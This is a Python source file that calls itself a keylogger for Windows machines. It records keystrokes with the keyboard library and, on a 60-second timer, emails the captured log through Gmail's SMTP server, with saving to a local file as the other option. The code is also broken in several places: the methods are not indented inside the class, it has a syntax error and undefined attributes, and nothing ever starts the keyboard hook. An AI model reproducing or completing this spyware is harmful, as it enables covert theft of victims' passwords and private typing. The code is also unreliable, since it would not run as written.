#! /usr/bin/env python3
# coding UTF-8

# Purpose:
#   to create a keylogger for windows machines

# pip install keyboard

import keyboard
import smtplib

from threading import Timer
from datetime import datetime


send_report = 60 #this is in seconds
email = 'use address without 2Factor'
password = 'password'

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()


def callback(self, event):
    #Callback is when keyboard event occurs, ie key release
    entry = event.name
    if len(entry) > 1:
        #not a char, or special key(ctrl, alt)
        #uppercase with []
        if entry == 'space':
            # inserting ' ' instead of word space
            entry = ' '
        elif entry == "enter":
            entry = '[ENTER]\n'
        elif entry == 'decimal':
            entry = '.'
        else:
            entry = entry.replace(" ", "_")
            entry = f'[{entry.upper()}]'
    self.log += entry

def update_filename(self):
    start_dt = str(self.start_dt)[:7].replace(" ", "-").replace(':', '')
    end_dt = str(self.dt)[:-7].replace(" ", "-").replace(':', '')
    self.filename = f'keylog-{start_dt}_{end_dt}'

def report_to_file(self):
    with open(f'{self.filename}.txt', 'w') as f:
        print(self.log, file.f)
    print(f'[+] Saved {self.filename}.txt')

def sendmail(self, email, password, message):
    server = smtplib.SMTP(host='smtp.gmail.com', port=587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

def report(self):
    if self.log:
        self.end_dt = datetime.now()
        self.update_filename()
        if self.report_method = 'email':
            self.sendmail(email, password, self.log)
        elif self.report_method == 'file':
            self.report_to_file()
        self.start_dt = datetime.now()
    self.log =''
    timer = Timer(interval=self.interval, function=self.report)
    timer.daemon = True
    timer.start()

